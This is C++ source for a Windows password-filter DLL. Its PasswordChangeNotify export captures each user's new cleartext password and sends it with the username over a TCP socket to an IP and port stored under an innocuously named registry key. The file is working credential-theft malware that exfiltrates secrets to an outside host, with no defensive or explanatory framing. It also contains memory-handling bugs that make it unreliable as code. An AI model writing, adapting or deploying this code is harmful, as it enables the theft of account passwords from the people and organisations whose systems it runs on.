// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "stdafx.h"
#include <WinSock2.h>
#include <Windows.h>
#include <stdlib.h>

#pragma comment(lib,"ws2_32.lib") //Winsock Library

#define rKey L"SYSTEM\\CurrentControlSet\\Control\\MUI\\Settings\\LanguageConfiguration"

DWORD getPtReg()
{
	HKEY hkey;
	DWORD dw;
	DWORD Type;
	DWORD Datasize = 255;
	DWORD port;


	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		rKey,
		0,
		KEY_QUERY_VALUE | KEY_WOW64_32KEY,
		&hkey) == ERROR_SUCCESS)

	{
		DWORD error = RegQueryValueEx(hkey,
			L"pt",
			NULL,
			&Type,
			(LPBYTE)&port,
			&Datasize);

		if (error == ERROR_SUCCESS)
		{
			RegCloseKey(hkey);
			return port;
		}
	}
	RegCloseKey(hkey);
	return 80;
}

char * getIPReg()
{
	HKEY hKey;
	char Data[255];
	DWORD Datasize = sizeof(Data);
	DWORD Type;
	char ipa[20];
	int indCtr = 0;

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		rKey,
		0,
		KEY_QUERY_VALUE | KEY_WOW64_32KEY,
		&hKey) == ERROR_SUCCESS)

	{
		DWORD error = RegQueryValueEx(hKey,
			L"ipa",
			NULL,
			&Type,
			(LPBYTE)&Data,
			&Datasize);

		if (error == ERROR_SUCCESS)
		{
			for (int i = 0; i < sizeof(Data); i += 2)
			{
				if (Data[i] == '\0')
				{
					ipa[indCtr] = '\0';
					break;
				}
				else
				{
					ipa[indCtr] = Data[i];
					indCtr++;
				}

			}
			//printf("%s", ipa);
			RegCloseKey(hKey);
			return ipa;
		}

	}

	RegCloseKey(hKey);
	return ipa;
}


int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
{
	HKEY hKey;
	char Data[255];
	DWORD Datasize = sizeof(Data);
	DWORD Type;
	char* ipa;

	char* ip = getIPReg();
	DWORD port = getPtReg();
	printf("%s:%d", ip, port);

	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;

	char user[50];
	char pass[50];
	char creds[100];

	wcstombs(user, username->Buffer, sizeof(user));
	wcstombs(pass, password->Buffer, sizeof(pass));

	strcat(pass, ";end");
	strcat(creds, user);
	strcat(creds, ":");
	strcat(creds, pass);

	printf("\nInitialising Winsock...");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("Failed. Error Code : %d", WSAGetLastError());
		return 1;
	}

	printf("Initialised.\n");

	//Create a socket
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d", WSAGetLastError());
	}

	printf("Socket created.\n");


	server.sin_addr.s_addr = inet_addr(ip);
	server.sin_family = AF_INET;
	server.sin_port = htons(port);

	//Connect to remote server
	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
	{
		puts("connect error");
		return 1;
	}

	puts("Connected");

	//Send some data
	//message = "GET / HTTP/1.1\r\n\r\n";
	if (send(s, creds, strlen(creds), 0) < 0)
	{
		puts("Send failed");
		return 1;
	}
	puts("Data Send\n");

	return 0;
}


extern "C" __declspec(dllexport)
BOOL WINAPI InitializeChangeNotify(void)
{
	return TRUE;
}

extern "C" __declspec(dllexport)
NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeID, PUNICODE_STRING NewPassword)
{
	SavePassword(UserName, NewPassword);
	return TRUE;
}

extern "C" __declspec(dllexport)
BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation)
{
	printf("yeah we trollin");
	return TRUE;
}

BOOL APIENTRY Dllmain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH: //JUMP
	case DLL_THREAD_ATTACH:  //OUT
	case DLL_THREAD_DETACH:  //THE
	case DLL_PROCESS_DETACH: //HOUSE
		break;
	}
	return TRUE;
}

